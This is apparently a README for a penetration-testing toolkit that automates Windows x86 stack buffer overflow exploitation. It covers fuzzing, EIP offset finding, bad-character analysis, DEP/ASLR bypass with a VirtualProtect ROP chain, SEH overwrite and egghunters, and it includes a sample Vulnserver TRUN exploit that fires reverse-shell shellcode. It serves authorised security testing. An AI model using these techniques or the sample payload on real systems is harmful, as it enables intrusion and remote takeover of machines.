# BOF Toolkit v2.3

> **Buffer Overflow Automation Toolkit for Thick Client / COTS Security Assessments**

A fully interactive, terminal-driven Python toolkit that automates the entire x86 Windows stack-based buffer overflow workflow — from initial fuzzing all the way through to firing a working reverse shell. Designed for penetration testers conducting thick-client and COTS binary assessments.

---

## ⚠️ Legal Disclaimer

This tool is intended **exclusively for authorised security testing**. Only use it against systems you own or have explicit written permission to test. Unauthorised use against systems you do not have permission to test is illegal. The author accepts no liability for misuse.

---

## Features

- **Full interactive menu** — persistent state panel shows current offset, bad bytes, return address and ROP status at every step
- **Metasploit-compatible cyclic pattern** — identical output to `msf-pattern_create` / `msf-pattern_offset`, no discrepancies
- **Automatic little-endian byte reversal** — paste addresses exactly as shown in WinDbg / Immunity / x64dbg, no manual reversal needed
- **Flexible prefix/suffix** — supports raw ASCII (`TRUN /./`), newline escapes (`\n`, `\r`), hex bytes, and `\x` escape form
- **msfvenom auto-integration** — generates, parses and embeds shellcode automatically, no copy-paste required
- **DEP + ASLR bypass** — full interactive VirtualProtect ROP chain builder with step-by-step WinDbg/mona guidance
- **SEH chain overwrite** — full nSEH/SEH methodology with POP POP RET gadget integration
- **Egghunter generation** — 32-byte NtAccessCheckAndAuditAlarm egghunter with custom tag
- **PoC report output** — generates a clean, labelled Python PoC script and component breakdown table ready to paste into a pentest report

---

## Requirements

### Python
- Python 3.8+
- `colorama` (optional — for coloured terminal output)

```bash
pip install colorama
```

### External tools (optional but recommended)
| Tool | Purpose |
|---|---|
| Metasploit (`msfvenom`) | Auto shellcode generation in Phase 6/7 |
| Immunity Debugger + mona.py | Finding gadgets, ROP skeletons, bad chars |
| WinDbg / x64dbg | Debugging target on Windows |
| ropper / rp++ | Finding ROP gadgets from non-ASLR modules |
| PE-bear / CFF Explorer | Checking module protection flags |

---

## Installation

```bash
git clone https://github.com/yourusername/bof-toolkit.git
cd bof-toolkit
pip install colorama        # optional
python3 bof_toolkit.py
```

No other installation is required. The script is self-contained.

---

## Quick Start

```bash
python3 bof_toolkit.py
```

The tool opens an interactive menu. At every step the current state (target, offset, bad bytes, return address, ROP status) is shown at the top of the screen.

---

## Menu Reference

```
 1.  Configure target + prefix/suffix
 2.  Phase 1   – Fuzz for crash length
 3.  Phase 2   – Find EIP offset          [works without Phase 1]
 4.  Phase 3   – Verify EIP control (BBBB test)
 5.  Phase 4   – Bad character analysis
 6.  Phase 5   – Set return address (JMP ESP)
 7.  Phase 6   – Shellcode + fire         [no DEP/ASLR]
 8.  Phase 7   – DEP + ASLR bypass (VirtualProtect ROP chain)
 9.  Phase 8   – SEH chain overwrite
10.  Phase 9   – Mitigation recon hints
11.  Phase 10  – Egghunter generator
12.  Build & fire  (manual shellcode paste)
13.  Display PoC payload breakdown
 0.  Exit
```

---

## Workflow Guides

### Standard Stack Overflow (No DEP / No ASLR)

This is the typical path for legacy COTS thick-client applications.

```
Option 1  →  Configure target (IP, port, prefix, suffix)
Option 2  →  Fuzz to find approximate crash byte count
Option 3  →  Send Metasploit-compatible cyclic pattern, paste EIP → get offset
Option 4  →  Verify EIP = 42424242 (BBBB) in debugger
Option 5  →  Identify bad bytes by inspecting ESP dump
Option 6  →  Set JMP ESP return address from debugger
Option 7  →  Auto-run msfvenom, embed shellcode, fire reverse shell
Option 13 →  Export PoC script for report
```

### DEP + ASLR Bypass (VirtualProtect ROP Chain)

Use when the target has DEP enabled. Requires at least one non-ASLR module for gadgets.

```
Options 1–6  →  Same as above (offset, bad chars, ROP pivot address)
Option 8     →  Interactive ROP chain builder:
                 Step 1 — Identify non-ASLR module (!mona modules)
                 Step 2 — Find VirtualProtect address (x kernel32!VirtualProtect)
                 Step 3 — Find writable memory address (.data section)
                 Step 4 — Collect 8 ROP gadgets (POP regs, PUSHAD, write primitive)
                 Step 5 — Auto msfvenom shellcode generation
                          → Chain assembled and payload fired automatically
Option 13    →  Export PoC script
```

### SEH Chain Overwrite

Use when the application catches exceptions before the function returns (no direct EIP overwrite).

```
Options 1–5  →  Configure, fuzz, find offset
Option 9     →  SEH workflow:
                 - Send cyclic pattern
                 - Read nSEH value from SEH chain (Alt+S in Immunity)
                 - Provide POP POP RET gadget address
                 → Payload: [padding] + [\xeb\x06\x90\x90] + [POP POP RET] + [NOP] + [shellcode]
```

### Egghunter (Tight Buffer)

Use when the buffer after EIP is too small to hold shellcode, but a larger input lands elsewhere in memory.

```
Option 11  →  Generate egghunter with custom tag (default: w00t)
           →  Place egghunter in tight buffer after EIP
           →  Place egg-prefixed shellcode in a larger input field
              (e.g. username field, different command)
```

---

## Prefix / Suffix Configuration

The script sends: `prefix + payload + suffix` as a single TCP write.

| Input format | Example | Result |
|---|---|---|
| Plain ASCII | `TRUN /./` | `b'TRUN /./'` |
| With escape | `HELP\r\n` | `b'HELP\r\n'` |
| Hex escape | `\x54\x52\x55\x4e` | `b'\x54\x52\x55\x4e'` |
| Pure hex | `48454c50` | asks hex/ASCII |
| Blank | *(Enter)* | `b''` |

**Vulnserver TRUN example:**
- Prefix: `TRUN /./`
- Suffix: *(blank)*

---

## Address Input Format

All addresses are accepted exactly as shown in your debugger. The script handles little-endian byte reversal automatically.

```
# All of these are equivalent and produce the same payload bytes:
625011af          ← Immunity / x64dbg display    (most common)
0x625011af        ← WinDbg display
62 50 11 af       ← space-separated
\xaf\x11\x50\x62  ← already reversed / \x form (used as-is)
```

The state panel always shows both forms side by side:
```
Return addr : 625011af  →  \xaf\x11\x50\x62
              ↑ debugger      ↑ payload bytes
```

---

## Cyclic Pattern

The pattern generated by Phase 2 is **byte-for-byte identical** to Metasploit's `msf-pattern_create`. You can cross-verify offsets with `msf-pattern_offset` and the results will always match.

```bash
# Equivalent commands — all give the same answer:
msf-pattern_offset -l 3000 -q 6f43386f
# Script Phase 2 → paste 6f43386f → offset: 2005

# Manual override also available — if you already ran msf-pattern_offset,
# just type the number (e.g. 2005) at the EIP prompt.
```

---

## DEP / ASLR Bypass — ROP Chain Detail

Phase 7 (Option 8) builds a **VirtualProtect PUSHAD skeleton** — the most reliable technique for x86 DEP bypass on Windows. It works by setting CPU registers to VirtualProtect's arguments, then using a `PUSHAD; RET` gadget to push them all onto the stack as a call frame.

### VirtualProtect call arguments set up in registers:

| Register | Argument | Value |
|---|---|---|
| EAX | VirtualProtect address | From IAT / resolved VA |
| EBX | dwSize | `0x201` (513 bytes) |
| ECX | lpflOldProtect | Any writable address |
| EDX | flNewProtect | `0x40` (PAGE_EXECUTE_READWRITE) |
| EDI | Return gadget | JMP ESP (after VP returns) |
| EBP | lpAddress | Shellcode location on stack |

### Gadgets required:

```
POP EAX; RET          – load VirtualProtect address
POP EBX; RET          – load dwSize (0x201)
POP ECX; RET          – load lpflOldProtect pointer
POP EDX; RET          – load flNewProtect (0x40)
PUSHAD; RET           – push all regs onto stack as VP call frame
INC EAX; RET          – value building helper
MOV [EAX], ECX; RET   – write primitive for stack patching
JMP ESP               – redirect to shellcode after VP returns
```

### Finding gadgets (recommended commands):

```bash
# ropper
ropper --file target.exe --search "pop eax; ret"
ropper --file essfunc.dll --search "pushad; ret"

# mona (Immunity Debugger)
!mona rop -m "essfunc.dll" -cpb '\x00\x0a\x0d'
!mona modules   # check which modules have ASLR=False
```

---

## Mitigation Decision Tree

```
Check with: !mona modules  /  !nmod  /  PE-bear

No DEP, No ASLR   →  Option 7   (direct JMP ESP + shellcode)
DEP only           →  Option 8   (VirtualProtect ROP, gadgets from any module)
ASLR only          →  Option 7   (use gadgets from non-ASLR module)
DEP + ASLR         →  Option 8   (gadgets must come from non-ASLR module)
SafeSEH present    →  Option 9   (SEH overwrite using non-SafeSEH module)
CFG enabled        →  ROP to valid indirect call targets only
```

---

## PoC Report Output (Option 13)

After a successful exploit, Option 13 generates a complete Python PoC script with every payload component as a named variable:

```python
prefix   = b"TRUN /./"
padding  = b"A" * 2005
ret_addr = b"\xaf\x11\x50\x62"   # 625011af (JMP ESP)
nop_sled = b"\x90" * 16
shellcode = (
    b"\xfc\xe8\x82\x00..."        # windows/shell_reverse_tcp
)
filler   = b"D" * 368

payload  = padding + ret_addr + nop_sled + shellcode + filler

with socket.socket() as s:
    s.connect((HOST, PORT))
    s.sendall(prefix + payload)
```

It also outputs a component summary table:

```
Component          Bytes   Content / Notes
──────────────────────────────────────────────────
Prefix                 8   b'TRUN /./'
Padding (A's)       2005   b'A' × 2005
Return address         4   625011af → \xaf\x11\x50\x62
NOP sled              16   b'\x90' × 16
Shellcode            341   341 bytes
Filler (D's)         368   b'D' × 368
──────────────────────────────────────────────────
TOTAL               2742
```

The script can be saved directly to a `.py` file from within the tool.

---

## Changelog

| Version | Changes |
|---|---|
| v2.3 | Full DEP + ASLR VirtualProtect ROP chain workflow. PoC payload export (Option 13). Mitigation recon expanded with bypass decision tree. |
| v2.2 | Return address auto-reversed from debugger display order. State panel shows both display and payload forms. SEH POP POP RET address also auto-reversed. |
| v2.1 | Cyclic pattern byte-for-byte identical to `msf-pattern_create`. EIP offset correctly handles little-endian reversal. Phase 2 accepts manual offset without automation. |
| v2.0 | Prefix/suffix ASCII + hex + escape mode. Phase 1 manual crash entry for silent-crash apps. Phase 2 works without Phase 1. msfvenom auto-embed and fire. |

---

## File Structure

```
bof-toolkit/
├── bof_toolkit.py     # Main script — single file, no other dependencies
└── README.md          # This file
```

---

## Common Issues

**Script shows offset 1273 but msf-pattern_offset says 2005**
Fixed in v2.1. The old custom De Bruijn charset produced different output to Metasploit. The current implementation is byte-for-byte identical.

**Reverse shell payload doesn't work / EIP jumps to wrong address**
Fixed in v2.2. The return address was not being byte-reversed. Paste the address exactly as shown in the debugger — the script reverses it automatically.

**Phase 1 fuzzes to maximum without detecting a crash**
Normal for GUI apps that crash without closing the socket. When prompted, enter the byte count you observed in the debugger manually. Phase 2 then works normally.

**msfvenom not found**
The script falls back to manual shellcode paste mode. Run from a Kali Linux machine or install Metasploit Framework.

**`\x00` appearing in ROP gadget addresses**
The address contains a null byte which will terminate the string copy in the vulnerable function. Find a different gadget at an address with no null bytes, or use a different non-ASLR module.

---

## References

- Corelan Team — Stack Based Overflow tutorials: https://www.corelan.be/index.php/articles/
- mona.py documentation: https://github.com/corelan/mona
- ropper: https://github.com/sashs/Ropper
- Metasploit Framework: https://github.com/rapid7/metasploit-framework
- skape — Safely Searching Process Virtual Address Space (egghunter research)

---

## Licence

MIT Licence — free to use, modify and distribute. Attribution appreciated.
